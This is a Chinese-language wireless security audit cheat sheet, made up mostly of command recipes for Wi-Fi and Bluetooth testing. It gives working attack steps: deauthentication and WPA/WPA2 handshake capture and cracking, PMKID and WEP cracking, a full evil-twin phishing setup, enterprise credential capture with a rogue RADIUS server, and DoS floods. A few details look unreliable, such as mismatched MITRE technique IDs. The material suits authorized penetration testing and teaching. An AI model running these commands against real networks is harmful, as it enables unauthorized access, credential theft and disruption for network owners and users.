---
id: 11-001
title: "📶 Wi-Fi安全审计 (Wi-Fi Security Audit)"
category: 无线安全
category_en: "Wireless Security"
difficulty: ★★★
tools: "Aircrack-ng, Wireshark, Airodump-ng, Hashcat"
last_updated: 2025-07
tags: ["wireless-security", "wifi", "wpa", "network-audit"]
subdomain: wireless-security
nist_csf: ["PR.AC-01", "PR.DS-02"]
mitre_attack: ["T1559", "T1465"]
---
# 📶 Wi-Fi安全审计 (Wi-Fi Security Audit)

## 概述
评估无线网络的安全性，包括加密协议检测、弱密码破解、钓鱼接入点检测和客户端攻击。

## 核心技能

### 1. 无线网络信息收集

```bash
# 查看无线接口信息
iwconfig
ifconfig wlan0
ip link show wlan0

# 启用监听模式
airmon-ng check kill
airmon-ng start wlan0
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# 扫描可用网络
airodump-ng wlan0mon
airodump-ng wlan0mon --band abg  # 扫描2.4GHz和5GHz

# 扫描特定信道
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX wlan0mon

# 显示周围WiFi信息
nmcli dev wifi list
sudo iwlist wlan0 scan | grep -E "ESSID|Channel|Encryption|Quality"

# GPS位置标记（配合WiFi定位）
airodump-ng -w scan --gpsd wlan0mon

# Kismet扫描
kismet -c wlan0mon
```

### 2. WPA/WPA2破解

```bash
# 捕获WPA握手包
# 1. 监听目标网络
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w wpa_handshake wlan0mon

# 2. 强制客户端重新认证（deauth攻击）
aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX wlan0mon  # 发送10个deauth包
aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon  # 指定客户端

# 3. 确认捕获到握手包
# 查看捕获的文件，等待显示 "WPA handshake: XX:XX:XX:XX:XX:XX"

# 使用字典破解
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b XX:XX:XX:XX:XX:XX wpa_handshake-01.cap

# 使用hashcat GPU加速（转换为hccapx格式）
cap2hccapx wpa_handshake-01.cap wpa_handshake.hccapx
hashcat -m 2500 -a 0 wpa_handshake.hccapx /usr/share/wordlists/rockyou.txt

# 使用PMKID攻击（无需客户端）
# 一些较新AP会发送PMKID
hcxdumptool -o pmkid.pcapng -i wlan0mon --enable_status=1
# 转换格式
hcxpcaptool -z pmkid.16800 pmkid.pcapng
# 破解
hashcat -m 16800 -a 0 pmkid.16800 /usr/share/wordlists/rockyou.txt

# WPA3破解
# 捕获WPA3握手
# 使用Dragonslayer工具
python3 dragonslayer.py wlan0mon
```

### 3. WEP破解

```bash
# WEP破解（已过时但可能还存在）
# 1. 捕获数据包
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w wep_crack wlan0mon

# 2. ARP请求重放（加速IVs收集）
aireplay-ng -3 -b XX:XX:XX:XX:XX:XX wlan0mon

# 3. 收集足够的IVs（约20,000-40,000个）
# 当IVs足够时破解
aircrack-ng wep_crack-01.cap

# 使用arpforge创建伪造ARP包
aireplay-ng -4 -b XX:XX:XX:XX:XX:XX wlan0mon
```

### 4. Evil Twin攻击

```bash
# 创建伪造接入点
# 使用airbase-ng
airbase-ng -a XX:XX:XX:XX:XX:XX --essid "TargetWiFi" -c 6 wlan0mon

# 使用hostapd
cat hostapd.conf
interface=wlan0
driver=nl80211
ssid=TargetWiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0

hostapd hostapd.conf

# 完整Evil Twin攻击流程
# 1. 停止合法AP
aireplay-ng -0 5 -a REAL_AP_BSSID wlan0mon

# 2. 启动伪造AP
airbase-ng -a FAKE_BSSID --essid "TargetWiFi" -c 6 wlan0mon &
sleep 2

# 3. 配置DHCP和NAT
ifconfig at0 up
ifconfig at0 10.0.0.1 netmask 255.255.255.0
# 配置dnsmasq
cat > dnsmasq.conf << EOF
interface=at0
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
EOF
dnsmasq -C dnsmasq.conf

# 4. 启用转发和NAT
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# 5. 使用Captive Portal或SSLStrip
# 创建钓鱼页面
# 使用Wifiphisher
wifiphisher
```

### 5. WPA企业版攻击

```bash
# WPA-Enterprise (802.1X) 攻击
# 1. 建立伪造的RADIUS服务器

# 使用hostapd-wpe
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# 捕获客户端凭证
# 当用户连接到伪造AP时，捕获MSCHAPv2挑战-应答

# 破解捕获的哈希
asleap -r hostapd-wpe.log

# 使用FreeRADIUS-WPE
# 自动设置RADIUS服务器
echo "Install freeradius"
# 配置EAP捕捉

# EAP攻击检测
# 1. 检查是否可获取匿名身份
# 2. 检查证书验证是否完整
# 3. 测试PEAP/MSCHAPv2降级
```

### 6. 无线DoS攻击

```bash
# Deauth攻击
aireplay-ng -0 0 -a XX:XX:XX:XX:XX:XX wlan0mon  # 持续deauth
mdk3 wlan0mon d -c 6 -b XX:XX:XX:XX:XX:XX  # 批量deauth

# Beacon Flood攻击
mdk3 wlan0mon b -c 6

# 身份验证洪水攻击
mdk3 wlan0mon a -a XX:XX:XX:XX:XX:XX

# 取消关联攻击
mdk3 wlan0mon d -c 6 -b XX:XX:XX:XX:XX:XX

# 干扰攻击
# 使用专用硬件（ESP8266/ESP32）
# 使用RF信号发生器
```

### 7. 蓝牙安全测试

```bash
# 蓝牙侦察
hcitool scan         # 发现蓝牙设备
hcitool inq          # 查询设备
hcitool name XX:XX:XX:XX:XX:XX  # 获取设备名称
hcitool info XX:XX:XX:XX:XX:XX  # 获取设备信息

# 蓝牙服务发现
sdptool browse XX:XX:XX:XX:XX:XX  # 浏览服务
sdptool records XX:XX:XX:XX:XX:XX # 查看记录
sdptool search SP                  # 搜索串口服务

# 蓝牙攻击
# BlueBorne (CVE-2017-0781等)
# 使用blueborne scanner
python3 blueborne-scanner.py

# BT LE (Bluetooth Low Energy)
# 使用gatttool
gatttool -b XX:XX:XX:XX:XX:XX -I
[XX:XX:XX:XX:XX:XX][LE]> connect
[XX:XX:XX:XX:XX:XX][LE]> primary
[XX:XX:XX:XX:XX:XX][LE]> characteristics

# 使用Btlejack扫描BTLE
btlejack -s -c 37-39
btlejack -f 0x123456789ABC -c 37-39

# BlueZ工具
bluetoothctl
[bluetooth]# scan on
[bluetooth]# devices
[bluetooth]# pair XX:XX:XX:XX:XX:XX
[bluetooth]# connect XX:XX:XX:XX:XX:XX
```

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Aircrack-ng | 无线安全套件 | https://www.aircrack-ng.org/ |
| Kismet | 无线网络探测器 | https://www.kismetwireless.net/ |
| Reaver | WPS破解 | https://github.com/t6x/reaver-wps-fork-t6x |
| Wifiphisher | 钓鱼框架 | https://github.com/wifiphisher/wifiphisher |
| Bettercap | 中间人攻击框架 | https://www.bettercap.org/ |
| HCXDumpTools | PMKID捕获 | https://github.com/ZerBea/hcxdumptool |
| Btlejack | BLE安全工具 | https://github.com/virtualabs/btlejack |
| hostapd-wpe | 企业WPA攻击 | https://github.com/OpenSecurityResearch/hostapd-wpe |

## 参考资源
- [Wireless Security Guide](https://owasp.org/www-community/controls/Testing_for_Wireless_Security)
- [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
- [HackTricks - Wireless](https://book.hacktricks.xyz/generic-methodologies-and-resources/wireless)
- [Bluetooth Security Research](https://github.com/IndrajeetPatil/Bluetooth-Security-Research)
